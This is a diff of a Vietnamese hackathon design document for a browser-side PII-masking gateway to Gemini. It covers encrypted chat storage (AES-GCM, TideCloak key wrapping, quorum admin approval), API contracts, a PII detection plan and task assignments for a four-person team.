-export const VN_ADDR_REGEX = /\b(?:(?:số|so|nhà|nha|lô|lo|căn hộ|can ho)\s+\d+[A-Za-z0-9\/.-]*[\s,]+)?(?:(?:ngõ|ngo|ngách|ngach|hẻm|hem|kiệt|kiet|đường|duong|phố|pho|ấp|ap|thôn|thon|khu phố|kp|tổ|to)\s+[A-Za-zÀ-ỹ0-9\/.\s]{1,35}?[\s,]+)+(?:(?:phường|phuong|p\.|xã|xa|x\.|thị trấn|tt\.|quận|quan|q\.|huyện|huyen|h\.|thành phố|tp\.|tỉnh|tinh)\s+[A-Za-zÀ-ỹ0-9\s]{1,30}(?:[\s,]+(?:quận|quan|q\.|huyện|huyen|h\.|thành phố|tp\.|tỉnh|tinh)\s+[A-Za-zÀ-ỹ0-9\s]{1,30})*)/gi;
+DecryptedState {            // chỉ tồn tại ở client
+  conversationId, revision, title,
+  piiMap,
+  turns: [{ turnId, userOriginal, userMasked, assistantRawMasked, status }]
+}
 ```
 
-### 6.3. Nhận diện Tên Người Tiếng Việt 3 Tầng (Bắt cả Có dấu & Không dấu / Viết thường)
-1. **Tầng 1 (User Dictionary & Session Alias Propagation):** Khi bắt được tên đầy đủ `"Nguyễn Văn Hùng"` ở đầu hội thoại, tự động sinh các biến thể rút gọn (`"Văn Hùng"`, `"anh Hùng"`, `"nguyen van hung"`, `"anh hung"`) vào bảng tra của phiên để các câu sau gõ tắt vẫn ánh xạ về đúng `[NAME_1]`.
-2. **Tầng 2 (Heuristic 60 Họ phổ biến + Tên đệm + Danh xưng ngữ cảnh):**
-   - Bắt cụm 2–4 âm tiết viết hoa chữ cái đầu (`Nguyễn Văn A`, `Tran Thi Mai`) bắt đầu bằng 1 trong 60 họ phổ biến Việt Nam (`nguyễn, trần, lê, phạm, hoàng, huỳnh, phan, vũ, võ, đặng, bùi, đỗ, hồ, ngô, dương, lý...`).
-   - Bắt cả cụm **viết thường không dấu** (`anh nguyen van an`, `khach hang le thi hoa`) khi đứng sau danh xưng (`anh, chị, ông, bà, em, khách hàng, bệnh nhân, chủ tài khoản, người vay, tên là...`) hoặc khớp cấu trúc `[Họ VN] + [Đệm phổ biến: van/thi/huu/duc/minh/ngoc/thanh/quoc/gia/xuan] + [Tên]` và không thuộc danh sách từ ghép thông thường (`nguyen van ban`, `ly do`, `van ban`, `hoang mang`, `ha noi`, `ho chi minh`...).
-3. **Tầng 3 (Tùy chọn Lazy-load WebWorker ONNX NER):** Chạy ngầm `@huggingface/transformers` trong WebWorker (cache IndexedDB) nếu người dùng bật chế độ AI Deep Scan.
+Metadata như tài khoản sở hữu, thời gian, số hội thoại và kích thước bản mã vẫn lộ cho server. Không dùng thông điệp “DB không có bất kỳ plaintext nào”. MVP giới hạn 20 lượt hoàn chỉnh và 256 KiB bản mã/snapshot; khi vượt giới hạn yêu cầu tạo hội thoại mới. Đây là giới hạn demo, chưa là thiết kế cho lịch sử lớn.
 
-### 6.4. Ghép lại Token Khi Streaming (Accumulated Prefix + Single-Pass Fuzzy Unmasker)
-- **System Prompt bắt buộc gắn ở Gateway:** Yêu cầu LLM giữ nguyên tuyệt đối định dạng `[LOẠI_SỐ]`, không dịch, không bỏ ngoặc, và không bao giờ nhúng token vào URL/Markdown image.
-- **Thuật toán chống cắt đôi chunk (`[NA` + `ME_1]`) và chống lỗi `NAME 1` vs `NAME 12`:**
-  - Giữ bộ đệm `rawMaskedStream` nguyên bản trong RAM. Mỗi khi nhận chunk SSE mới, cắt riêng phần đuôi ở cuối chuỗi nếu đang mở dở ngoặc `[` hoặc đang gõ dở tiền tố token (`/(\[[^\]]{0,24}|(?:NAME|PHONE|CCCD|CMND|STK|EMAIL|ADDR|TAX_ID|LICENSE_PLATE|ORG|MONEY|DATE)[_\s-]*\d*)$/i`).
-  - Quét **1 lượt duy nhất (Single-Pass Regex Tokenizer)** trên phần tiền tố đã hoàn chỉnh để thay thế mọi token (kể cả biến thể bị LLM làm lệch như `[Name_1]`, `(NAME_1)`, `NAME_1`) bằng giá trị thật trong `piiMap`, **nhưng bỏ qua không thay thế nếu token nằm trong thuộc tính URL (`http://`, `https://`, `href=`, `src=`)**.
+### 5.2. Quy tắc khóa và xác thực bản mã
 
----
+1. Client sinh `conv_id` bằng UUID và `K_conv` 32 byte bằng CSPRNG. Bọc `K_conv` bằng Tide sau đăng nhập. Khóa bảo vệ của Tide và `K_conv` là hai lớp khác nhau: **K_conv đầy đủ có tồn tại ở client**.
+2. Dẫn xuất `DEK_state` bằng HKDF-SHA256, gắn với phiên bản schema, định danh chủ sở hữu và `conv_id`. Dùng WebCrypto AES-256-GCM, IV ngẫu nhiên 12 byte mới mỗi lần mã hóa; không tái sử dụng IV có chủ ý.
+3. AAD là một cấu trúc serialize ổn định, ví dụ mảng JSON UTF-8: `[1, "state", ownerId, convId, revision]`. Hai phía thống nhất `ownerId = base64url(SHA-256(UTF8(JSON.stringify([issuer, sub]))))`; issuer/sub lấy từ phiên đã xác thực. Không tin giá trị chủ sở hữu trả về tùy ý từ DB. Sau giải mã kiểm tra ID và revision bên trong snapshot khớp header/ngữ cảnh kỳ vọng.
+4. Import khóa với `extractable: false` khi phù hợp; chỉ giữ khóa trong bộ nhớ và bỏ tham chiếu khi logout/đóng hội thoại. Hủy request đang chờ và bỏ callback thuộc phiên cũ để không render/lưu nhầm sau đổi tài khoản. Xóa byte buffer là cố gắng giảm phơi lộ, không hứa xóa mọi bản sao trong JS runtime. Không lưu khóa thô trong localStorage/IndexedDB.
+5. Khi cập nhật, gửi `expectedRevision` và snapshot revision kế tiếp. Backend dùng compare-and-swap trong transaction, trả `409` nếu xung đột; UI yêu cầu tải lại thay vì ghi đè âm thầm. Tạo mới dùng ID duy nhất và xử lý retry không tạo bản ghi trùng.
+6. Xác thực AES-GCM thất bại thì không hiển thị nội dung hoặc tự khôi phục bằng bản rõ. Ghi mã lỗi kỹ thuật không chứa nội dung.
 
-## 7. Đặc tả Database, API & Hợp đồng Code (Sẵn sàng Code Ngay Sáng Ngày 1)
+**Phạm vi bảo đảm:** phát hiện sửa ciphertext và tráo snapshot sang hội thoại/chủ sở hữu khác với ngữ cảnh client kỳ vọng. Không chứng minh freshness khi kẻ tấn công rollback toàn bộ dữ liệu và revision. Compare-and-swap xử lý ghi đồng thời trong hoạt động bình thường, không chống DBA độc hại.
 
-### 7.1. Schema PostgreSQL (`schema.sql` — Người B khởi tạo trong 5 phút)
-```sql
-CREATE TABLE conversations (
-  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-  owner_sub_hash TEXT NOT NULL,          -- SHA-256(jwt.sub)
-  wrapped_dek TEXT,                      -- Base64 K_conv bọc qua TideCloak doEncrypt (NULL nếu đã crypto-shred)
-  meta_version INT NOT NULL DEFAULT 1,   -- Đưa vào AAD_meta để chống rollback PII Map
-  meta_iv TEXT NOT NULL,                 -- 12-byte random IV (Base64), sinh mới mỗi lần cập nhật
-  encrypted_meta TEXT NOT NULL,          -- AES-256-GCM(DEK_map, padded_4KB({ title, piiMap, lastMsgIndex, strictMode }), AAD_meta)
-  is_shredded BOOLEAN DEFAULT FALSE,
-  created_at TIMESTAMPTZ DEFAULT NOW(),
-  updated_at TIMESTAMPTZ DEFAULT NOW()
-);
+Xóa hội thoại trong MVP là xóa bản ghi ở ứng dụng. Không gọi đó là hủy mật mã chống backup; không thêm escrow, thu hồi từng hội thoại hoặc cam kết thu hồi khóa đã mở trong RAM.
 
-CREATE TABLE messages (
-  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-  conv_id UUID NOT NULL REFERENCES conversations(id) ON DELETE CASCADE,
-  msg_index INT NOT NULL,                -- Thứ tự 0, 1, 2... đưa vào AAD_msg chống đảo thứ tự/cắt cụt
-  role TEXT NOT NULL CHECK (role IN ('user', 'assistant')),
-  iv TEXT NOT NULL,                      -- 12-byte random IV (Base64)
-  ciphertext TEXT NOT NULL,              -- AES-256-GCM(DEK_msg, padded_bucket({ plaintext, maskedText, spans }), AAD_msg)
-  created_at TIMESTAMPTZ DEFAULT NOW(),
-  UNIQUE(conv_id, msg_index)
-);
-```
+### 5.3. Hợp đồng API tối thiểu
 
-### 7.2. Hợp đồng REST & SSE API (`Người B ↔ Người D`)
-| Method & Endpoint | Request | Response | Ghi chú bảo mật |
-|---|---|---|---|
-| `POST /api/quota/tickets` | Header `Authorization: Bearer <tide_jwt>` | `{ tickets: Array<{ ticketId, exp, sig }> }` | Cấp vé ẩn danh để gọi Gateway không lộ `sub` |
-| `POST /api/conversations` | `{ wrappedDek, metaVersion, metaIv, encryptedMeta }` | `{ id, createdAt }` | DB chỉ lưu Base64 ciphertext |
-| `GET /api/conversations` | — | `Array<ConversationRow>` | Lọc theo `owner_sub_hash` |
-| `PATCH /api/conversations/:id` | `{ metaVersion, metaIv, encryptedMeta }` | `{ ok: true }` | Cập nhật `piiMap` mới (IV mới + `metaVersion + 1`) |
-| `DELETE /api/conversations/:id/shred` | — | `{ shredded: true, wipedDek: true }` | **Crypto-shredding**: xóa `wrapped_dek = NULL` |
-| `GET /api/conversations/:id/messages` | — | `Array<MessageRow>` | Client kiểm tra chuỗi `msg_index` liên tục `0..lastMsgIndex` |
-| `POST /api/conversations/:id/messages` | `{ msgIndex, role, iv, ciphertext }` | `{ id, createdAt }` | Lưu bản mã tin nhắn |
-| `POST /api/gateway/chat` (SSE) | Header `X-Gateway-Ticket` + Body `{ messages: [{role, content: maskedText}] }` | SSE: `event: gateway_echo` (hiển thị ở Cột 2), `event: token`, `event: done` | Stateless, 0 content log, chỉ nhận `maskedText` |
-| `GET /api/debug/inspector?convId=...` | `convId` | `{ pgConvRow, pgMsgRows, lastGatewayEcho }` | Dữ liệu thật 100% cho **Cột 3** (Live DB Inspector) |
-| `POST /api/debug/tamper` | `{ convId, msgId, action: 'swap_ct' \| 'flip_role' }` | `{ tampered: true }` | Phục vụ nút Demo **"Giả lập DBA Độc hại Sửa DB"** |
-
----
-
-## 8. Cổng Go/No-Go Giờ thứ 6 & Phương án Dự phòng Giữ Nguyên 3 Trụ Cột
-
-Tại **Giờ thứ 6 của Ngày 1**, Người A đánh giá 4 tiêu chí với TideCloak Docker:
-1. Container `tideorg/tidecloak-dev:latest` chạy ổn định và kích hoạt được license dev.
-2. `doEncrypt` / `doDecrypt` bọc/mở khóa được `K_conv` từ trình duyệt trong `< 1500ms`.
-3. Xác minh rõ cơ chế scope của tag (để chọn Nhánh A hoặc Nhánh B ở Mục 4.3).
-4. Tạo được Change Request yêu cầu Quorum ≥ 2 Admin duyệt.
-
-> [!IMPORTANT]
-> **Nếu TideCloak gặp sự cố mạng hoặc license sau 6 giờ:**
-> Chuyển biến môi trường sang `NEXT_PUBLIC_CRYPTO_MODE=fallback` (**Shamir Split-Key + WebCrypto Ed25519 Quorum**), **KHÔNG bỏ bất kỳ trụ cột nào**:
-> 1. **Giữ Trụ cột 1 (Chia mảnh khóa):** Dùng **Shamir's Secret Sharing (2-of-2)** trên trình duyệt tách khóa bọc `KEK` thành `Share_1` (lưu trong WebAuthn Passkey PRF / thiết bị người dùng) và `Share_2` (lưu trên Key-Share Microservice độc lập với Postgres). DBA chiếm Postgres không bao giờ có đủ 2 mảnh.
-> 2. **Giữ Trụ cột 2 (Quorum Admin chống God Admin):** Bảng `admin_change_requests` yêu cầu đủ **2 chữ ký số WebCrypto Ed25519** từ khóa cá nhân của 2 Admin độc lập trước khi lệnh cấp quyền có hiệu lực. Màn hình mời Giám khảo bấm "Approve & Sign" trên điện thoại vẫn hoạt động giống hệt 100%!
-
----
-
-## 9. Phân công 4 Thành viên & Lộ trình Thực thi (Có Definition of Done - DoD)
-
-### 9.1. Phân công Cân bằng Tải (4 Vai trò)
-| Thành viên | Vai trò | Trách nhiệm cụ thể (Không chồng chéo, không ai bị quá tải) |
+| Endpoint | Request / hành vi | Điều kiện bắt buộc |
 |---|---|---|
-| **Người A** | **Identity, TideCloak & Security Verification Lead** | Dựng TideCloak Docker + License + Realm/Roles; cấu hình Quorum Change-Request (≥2 Admin); viết `KeyWrapperProvider` (`tide` + `mock` + `fallback`); API cấp `Anonymous Quota Ticket`; viết UI Panel duyệt Quorum trên điện thoại và bộ test bảo mật tự động (`npm run test:security`). |
-| **Người B** | **Backend, Envelope Crypto & Stateless AI Gateway Lead** | Dựng PostgreSQL (`schema.sql`); viết `EnvelopeCryptoService` (HKDF-SHA256 + AES-256-GCM + AAD + Fixed-Bucket Padding); CRUD API lưu ciphertext + Crypto-shredding + API giả lập DBA Tamper; viết Stateless AI Gateway stream Gemini + Markdown Sanitizer + CSP Headers. |
-| **Người C** | **Vietnamese PII Engine, Evaluation Metrics & Slides Lead** | Viết `PIIService` (12 loại PII tiếng Việt + Context Window STK + 60 Họ VN có dấu/không dấu + Từ điển tùy chỉnh + Strict Mode + `riskScore`) và `StreamingFuzzyUnmasker`; xây dựng bộ test **≥ 300 câu tiếng Việt thực tế** + 50 tác vụ LLM-as-Judge; xuất bảng Metrics thật và dựng Slide Pitch từ Ngày 6. |
-| **Người D** | **3-Column Live Demo UI & Pitch Presenter Lead** | Dựng giao diện Chat + thanh **Interactive PII Preview & Click-to-Mask**; ghép **Màn hình 3 Cột Thời Gian Thực** (Cột 1: User View / Cột 2: Gateway Echo / Cột 3: Live Postgres Inspector + Nút Simulate DBA Attack + Nút Crypto-Shred); quay video backup 3 phút và dẫn chính khi thuyết trình. |
+| `POST /api/conversations` | `{ id, wrappedKey, revision: 1, iv, encryptedState }` | Xác thực JWT, server tự gán owner, giới hạn kích thước |
+| `GET /api/conversations` | Danh sách bản ghi thuộc user | Không trả tiêu đề bản rõ |
+| `GET /api/conversations/:id` | Một snapshot mã hóa | Kiểm tra quyền sở hữu |
+| `PUT /api/conversations/:id` | `{ expectedRevision, revision, iv, encryptedState }` | Owner check, cập nhật atomic, không đổi owner/wrappedKey tùy ý |
+| `DELETE /api/conversations/:id` | Xóa bản ghi của user | Owner check; mô tả giới hạn backup |
+| `POST /api/chat` | `{ requestId, messages: [{ role, content }] }` đã che | Xác thực, giới hạn role/kích thước/context/output, rate limit và quota |
 
-### 9.2. Checklist Theo Ngày (Kịch bản 7–10 Ngày)
-- **Ngày 1 (Nền móng & Cổng Go/No-Go Giờ thứ 6):**
-  - *Giờ 0–1:* Cả nhóm khởi tạo repo với `schema.sql`, `crypto.ts`, `pii.ts`; bật `NEXT_PUBLIC_CRYPTO_MODE=mock`.
-  - *Giờ 1–6:* A chạy 4 bước Spike TideCloak; B dựng Postgres + Gateway stream Gemini; C viết Regex VN v1 (`CCCD`, `PHONE`, `EMAIL`, `STK`, `MONEY`); D dựng khung UI 3 cột.
-  - **DoD cuối Ngày 1:** Chốt xong `tide` hay `fallback`; gửi được tin nhắn qua Mock UI $\rightarrow$ che SĐT/CCCD $\rightarrow$ Gemini stream trả lời.
-- **Ngày 2 (Mật mã Phong bì HKDF/AAD & Nhận diện Tên Tiếng Việt):**
-  - A cấu hình Quorum (2 Admin) + hoàn thiện `KeyWrapperProvider`; B hoàn thiện `EnvelopeCryptoService` (HKDF + AES-GCM AAD + Padding 4KB cho Map) + CRUD API; C hoàn thiện nhận diện Tên người VN (có dấu & không dấu) + Địa chỉ + Từ điển người dùng; D làm thanh Preview PII cho phép click bật/tắt/bôi đen thêm.
-  - **DoD cuối Ngày 2:** `SELECT * FROM messages` chỉ thấy ciphertext; F5 trình duyệt vẫn giải mã lại đúng lịch sử và giữ nguyên `[NAME_1]`.
-- **Ngày 3 (Tích hợp End-to-End, Dual-Track History & Streaming Unmasker):**
-  - A tích hợp đăng nhập thật + `Anonymous Quota Ticket`; B viết `/api/debug/inspector`, `/api/debug/tamper` và `/shred`; C hoàn thiện `StreamingFuzzyUnmasker`; D nối cả 3 cột với dữ liệu thật từ Backend/Gateway.
-  - **DoD cuối Ngày 3:** Chạy mượt luồng 3 cột thời gian thực + chat 3 lượt liên tiếp không lộ PII ở lượt 2 (Dual-Track).
-- **Ngày 4 (Quorum Live Demo, Nút Tấn công DBA & Chế độ Strict):**
-  - A dựng màn hình QR/Mobile để Giám khảo duyệt/từ chối Change Request của Admin; B khóa CSP/SRI + chặn Markdown image exfiltration; C hoàn thiện Strict Mode + `riskScore`; D hoàn thiện nút **"Simulate Rogue DBA Tamper"** (bấm vào hiện lỗi `AES-GCM AAD Authentication Failed` đỏ rực trên UI) và nút **"Crypto-Shred"**.
-  - **DoD cuối Ngày 4:** Diễn thử trọn vẹn kịch bản Demo 3 phút gồm cả màn chặn DBA và màn Quorum trên điện thoại.
-- **Ngày 5 (Đo kiểm 300 Câu Tiếng Việt & Kiểm toán Bảo mật Tự động):**
-  - A chạy `npm run test:security` (grep canary UTF-8/Base64/URL-encoded trên DB dump & Gateway log = 0); B đo latency p50/p95; C chạy benchmark trên ≥ 300 câu tiếng Việt + 50 bài LLM-as-Judge, tinh chỉnh các ca biên; D đánh bóng UI/UX.
-  - **DoD cuối Ngày 5:** Xuất đầy đủ bảng số liệu thực nghiệm (Precision, Recall, F1 theo từng loại PII, Leakage Rate, Utility Score, Latency ms).
-- **Ngày 6–7 (Hoàn thiện Slide, Threat Model & Ngân hàng Q&A):**
-  - C & D hoàn thiện ≤ 10 slide; A & B rà soát toàn bộ câu chữ theo المục 3 (Quy tắc ngôn từ).
-- **Ngày 8 (FEATURE FREEZE & Quay Video Dự phòng):**
-  - Đóng băng code; quay video demo 3 phút liền mạch (60fps) phòng trường hợp rớt mạng tại hội trường.
-- **Ngày 9–10 (Diễn tập Pitch & Đấu tập Q&A):**
-  - Chạy thử thuyết trình bấm giờ 3 phút × 5 lần; luyện phản xạ trả lời 10 câu hỏi Giám khảo (Mục 12) trong ≤ 30 giây/câu.
+Backend xác minh JWT theo issuer, audience, chữ ký và thời hạn phù hợp với cấu hình Tide đã chạy thử. Mọi endpoint đều kiểm tra quyền, không chỉ danh sách hội thoại. Không nhận `owner_id` từ body làm nguồn thẩm quyền. Gateway biết tài khoản gọi; `owner_id` đã hash cũng không có nghĩa là ẩn danh.
 
-### 9.3. Lịch trình Chiến thuật Bản 48 Giờ (Nếu Hackathon chỉ diễn ra 2 ngày cuối tuần)
-- **H0–H6:** Khởi tạo `schema.sql`, `crypto.ts`, `pii.ts`; A spike TideCloak (chốt Go/No-Go ở H6); B dựng Postgres + SSE Gemini Gateway; C viết Regex VN + Context STK + Heuristic Họ tên VN; D dựng UI 3 cột.
-- **H6–H16:** B viết Envelope Crypto (HKDF + AES-GCM AAD); C viết `StreamingFuzzyUnmasker` + `riskScore`; A cấu hình Quorum 2 Admin + `KeyWrapperProvider`; D ghép Preview PII + Click-to-Mask.
-- **H16–H28:** Tích hợp End-to-End cả 3 cột + nút Crypto-Shred + nút Simulate DBA Tamper + màn hình Demo Quorum trên điện thoại.
-- **H28–H38:** C chạy bộ test 120 câu tiếng Việt tiêu biểu lấy bảng Metrics thật; A & B khóa CSP + chạy Canary test; D hoàn thiện kịch bản demo "Hồ sơ vay ngân hàng".
-- **H38–H48:** Code Freeze ở H38; quay video backup; hoàn thiện 10 slide; tập Pitch + 10 câu Q&A.
+Không tạo debug/tamper API trong server dùng chung. Demo sửa ciphertext bằng script local trên DB chứa dữ liệu tổng hợp, có bản reset. Rate limit trong RAM chỉ chấp nhận cho một instance demo; triển khai nhiều instance cần bộ đếm chung và kiểm soát chi phí phù hợp.
 
----
+## 6. PII, chất lượng câu trả lời và dữ liệu nhiều lượt
 
-## 10. Bộ Chỉ số Thực nghiệm (Metrics) Bắt buộc Đưa Vào Slide
+1. Tự phát hiện CCCD, SĐT, email và STK bằng quy tắc có context. Không dùng bộ kiểm tra “hợp lệ” quá chặt để bỏ qua chuỗi có khả năng là PII; chuỗi nghi ngờ cần được đánh dấu cho người dùng kiểm tra.
+2. Tên người trong MVP lấy từ từ điển theo hội thoại hoặc thao tác chọn văn bản. Heuristic tên chỉ là gợi ý nếu còn thời gian; không tự suy ra mọi “anh Hùng” là cùng một người.
+3. Preview hiển thị phần đã che và phần sắp gửi. Người dùng có thể che thêm hoặc bỏ lựa chọn. Bấm gửi sử dụng đúng payload bất biến đã preview; nếu sửa đầu vào thì tạo preview mới. Ghi rõ preview không bảo đảm đã tìm đủ PII.
+4. Token dùng namespace ngẫu nhiên 128 bit theo hội thoại và ID ổn định, dạng `[[PCS_<namespace>_NAME_1]]`. Chỉ thay thế chính xác token đã phát hành và có trong map. Xử lý trường hợp người dùng nhập sẵn chuỗi giống token; không dùng fuzzy matching hay thay token lồng nhau.
+5. Lưu nguyên `assistantRawMasked` từ provider và dựng bản hiển thị bằng khôi phục token ở client. Các lượt sau chỉ gửi `userMasked` và `assistantRawMasked`, tuyệt đối không lấy DOM hoặc bản đã khôi phục để gửi lại. Module dựng request là điểm duy nhất được gọi Gateway và phải có test nhiều lượt.
+6. V1 render bằng text node/React escaping; không `dangerouslySetInnerHTML`, Markdown, ảnh hoặc tự tạo hyperlink. Token không khớp giữ nguyên và có thông báo; không đoán giá trị cần thay.
+7. Tiền, lãi suất, thời gian và dữ kiện nghiệp vụ chỉ được gửi khi người dùng cho phép. Nếu đánh dấu nhạy cảm nhưng tác vụ cần chúng, yêu cầu sửa prompt hoặc dừng gửi; không tuyên bố model tính đúng khi đầu vào đã bị loại bỏ. Phép tính local là nâng cấp có thể bổ sung sau.
+8. Đặt giới hạn context và timeout. Khi provider lỗi, giữ turn ở trạng thái pending/failed để người dùng thử lại; không lưu câu trả lời một phần thành kết quả hoàn chỉnh và không tự retry vô hạn.
 
-1. **Độ chính xác che PII tiếng Việt (trên ≥ 300 câu thực tế: hồ sơ vay, bệnh án, hợp đồng, văn bản không dấu/viết tắt):**
-   - Báo cáo **Recall (ưu tiên số 1)**, Precision, F1 cho từng nhóm (`CCCD`, `PHONE`, `STK`, `NAME` có dấu/không dấu, `ADDR`, `MONEY`, `TAX_ID`).
-   - **Direct PII Leakage Rate:** % câu test bị lọt ít nhất 1 định danh trực tiếp (mục tiêu `< 2%` trước preview và `0%` sau bước Interactive Preview).
-2. **Độ giữ nguyên chất lượng câu trả lời (Utility Preservation):**
-   - Điểm trung bình (thang 1–5 chấm bằng LLM-as-Judge trên 50 tác vụ tóm tắt/soạn thảo/phân tích tài chính) giữa bản gốc và bản đã giả danh hóa + **Unmasking Accuracy Rate** (% token được khôi phục nguyên vẹn).
-3. **Độ trễ tăng thêm (Latency Overhead — p50 / p95):**
-   - Thời gian quét PII + mã hóa AES-GCM trên trình duyệt: mục tiêu **`< 8 ms / tin nhắn`**.
-   - Thời gian mở khóa `K_conv` qua mạng TideCloak: chỉ tốn **`~200–400 ms` ở lần đầu mở hội thoại**, và **`0 ms`** cho mọi tin nhắn tiếp theo trong hội thoại đó nhờ Envelope Encryption.
-4. **Bằng chứng Kiểm toán Bảo mật (Security Verification Pass/Fail):**
-   - `0 bytes` chuỗi canary (UTF-8 / Base64 / URL-encoded) xuất hiện trong Postgres Dump và Gateway Log.
-   - `100%` thao tác DBA sửa/đảo/tráo bản mã trong Postgres bị chặn bởi `AES-GCM AAD Error`.
-   - `100%` thao tác Admin đơn lẻ tự cấp role giải mã bị chặn bởi `TideCloak Quorum Change-Request`.
+## 7. Phân công bốn người theo độ khó
 
----
+**Độ khó:** Dễ = thao tác rõ, ít phụ thuộc; Vừa = cần code và kiểm thử một module; Khó = tích hợp ngoài/mật mã/quyền truy cập, có thể chặn nhóm. Giờ là ước lượng làm việc tập trung, đã tách khỏi 48 giờ lịch; không phải thời gian cam kết.
 
-## 11. Kịch bản Live Demo 3 Phút & Cấu trúc 10 Slide Pitch
+**Ưu tiên:** Must phải hoàn thành trước khi tuyên bố tính năng tương ứng hoạt động; Should chỉ bắt đầu khi các Must liên quan đã đạt. Mỗi task có một người chịu trách nhiệm chính; reviewer chỉ xác nhận kết quả, không có nghĩa bắt buộc ghép đôi toàn thời gian.
 
-### 11.1. Kịch bản Live Demo 3 Phút ("Khoảnh khắc Wow" với Giám khảo)
-- **Bối cảnh (Persona):** Chuyên viên tín dụng ngân hàng cần nhờ Gemini phân tích nhanh một hồ sơ vay vốn 2,5 tỷ đồng của khách hàng *Nguyễn Văn Hùng* (chứa đầy đủ số CCCD, SĐT, STK Vietcombank, địa chỉ nhà, mức lương).
-- **Phút 0:00 – 1:00 (Trải nghiệm Người dùng & Giả danh hóa):**
-  - Đăng nhập qua TideCloak. Dán đoạn hồ sơ vay vào khung chat.
-  - Thanh **Interactive PII Preview** lập tức tô màu các thực thể (`Nguyễn Văn Hùng` $\rightarrow$ `[NAME_1]`, `001092012345` $\rightarrow$ `[CCCD_1]`, `0071000123456` $\rightarrow$ `[STK_1]`) kèm điểm rủi ro. Bấm gửi.
-- **Phút 1:00 – 2:00 (Màn hình 3 Cột Thời Gian Thực):**
-  - **Cột 1 (Chuyên viên thấy):** Câu trả lời tư vấn tín dụng streaming mượt mà với đầy đủ tên thật *Nguyễn Văn Hùng* và số tài khoản thật.
-  - **Cột 2 (AI Gateway / Gemini thấy):** Chỉ nhận được `[NAME_1]`, `[CCCD_1]`, `[STK_1]` đi kèm một `Anonymous Quota Ticket` không có danh tính người gửi.
-  - **Cột 3 (Postgres DB / Hacker thấy):** Toàn bộ nội dung là chuỗi Base64 AES-256-GCM ciphertext.
-- **Phút 2:00 – 3:00 (Tấn công Trực tiếp trên Sân khấu & Mời Giám khảo Duyệt Quorum):**
-  - **Đòn 1:** Bấm nút **"Simulate Rogue DBA: Swap/Tamper Ciphertext"** ngay trên Cột 3 $\rightarrow$ Giao diện lập tức phát hiện và chặn đứng với thông báo `Cryptographic Integrity Violation: AES-GCM AAD Mismatch`.
-  - **Đòn 2:** Mở tab Admin Console: một Admin nội bộ cố gắng tự gán role `_tide_branch_vip.decrypt` để đọc lén hồ sơ tín dụng chi nhánh $\rightarrow$ Bị khóa ở trạng thái **Pending Quorum Approval**. **Mời 1 vị Giám khảo quét mã QR (hoặc cầm điện thoại Admin thứ 2) bấm nút "Reject Change Request"** ngay tại bàn chấm!
+Các task A1–A5, B1–B5, C1–C5, D1–D3 và D5 là Must; riêng D4 là Should và được cắt đầu tiên khi trễ tiến độ.
 
-### 11.2. Cấu trúc 10 Slide Pitch
-1. **Hook:** Vụ kỹ sư Samsung lộ code mật lên ChatGPT + Áp lực từ **Luật BVDLCN 91/2025/QH15 (hiệu lực 01/01/2026, phạt tới 5% doanh thu)**.
-2. **Bài toán:** Sơ đồ "Ai đang đọc trộm đoạn chat AI của doanh nghiệp bạn hôm nay?" (Cloud LLM ở đầu trên + DBA/Admin/Hacker ở đầu dưới).
-3. **Giải pháp — 3 Trụ cột:** Envelope Encryption với khóa ngưỡng TideCloak + Quorum chống God Admin + Giả danh hóa PII tiếng Việt trên trình duyệt.
-4. **LIVE DEMO 3 PHÚT** *(Trọng tâm ăn điểm)*.
-5. **Kiến trúc Mật mã sâu:** Vì sao HKDF + AES-GCM AAD + Anonymous Ticket + Dual-Track History chặn đứng cả DBA lẫn rò rỉ đa lượt.
-6. **Kết quả Thực nghiệm (Metrics):** Bảng Recall/F1 trên 300 câu tiếng Việt, độ giữ nguyên chất lượng câu trả lời, và độ trễ `< 8ms/tin nhắn`.
-7. **Threat Model Trung thực:** Bảng rõ ràng những gì bảo vệ tuyệt đối, những gì giảm thiểu, và những gì nằm ngoài phạm vi.
-8. **So sánh Đối thủ & Lợi thế Cạnh tranh:** Vì sao vượt trội so với Private AI / Nightfall (vendor giữ khóa, tiếng Việt yếu), ChatGPT Enterprise (chỉ là cam kết hợp đồng, không chống được Admin nội bộ), và Local LLM (tốn GPU, không có AI xịn, DB nội bộ vẫn lưu bản rõ).
-9. **Mô hình Kinh doanh & Lộ trình (Roadmap):** B2B SaaS (`\$5–15/seat/tháng`) & On-prem SDK cho Ngân hàng, Fintech, Bệnh viện, Hãng luật VN; v2 làm Browser Extension ghim phiên bản; v3 kết hợp Open-weight LLM chạy trong GPU TEE.
-10. **Đội ngũ & Tổng kết.**
+### A — Phạm Chấn Khoa: TideCloak, QEA và xác minh bảo mật
 
----
+Ưu tiên giao cho người quen Docker/OIDC và có khả năng đọc tài liệu SDK. Khánh hỗ trợ ở các điểm tích hợp khó.
 
-## 12. Top 10 Câu hỏi Phản biện Hóc búa Nhất từ Giám khảo (Judge Q&A Cheat Sheet)
+| ID | Task | Khó | Giờ | Phụ thuộc | Tiêu chí hoàn thành |
+|---|---|---|---|---|---|
+| A1 | Dựng Tide, license, realm, login và pin phiên bản | Khó | 2–3 | Tài khoản/license, mạng | Người khác chạy lại được theo hướng dẫn; ghi blocker ở H2 nếu chưa chạy |
+| A2 | Adapter wrap/unwrap và test user A/B | Khó | 3–4 | A1 | A mở được sau reload; B không mở được khóa của A; semantics user/tag được ghi lại |
+| A3 | Cấu hình và quay một luồng QEA thật | Khó | 3–4 | A1 | Có hai danh tính admin; chứng minh request chưa đủ phê duyệt không có hiệu lực |
+| A4 | Hỗ trợ xác minh JWT phía backend và kiểm thử truy cập chéo user | Vừa | 2–3 | A1, B2 | JWT sai/hết hạn bị từ chối; đọc/sửa/xóa conversation của B bị chặn |
+| A5 | Rà soát client/log/key lifecycle và viết ghi chú threat model | Vừa | 2–3 | A2, B1, D3 | Không lưu khóa thô; logout bỏ state; danh sách giới hạn khớp hành vi demo |
 
-1. **"Sao doanh nghiệp không tự chạy Ollama / Llama 3 nội bộ (on-prem) cho an toàn, cần gì che PII rồi gửi lên Cloud?"**
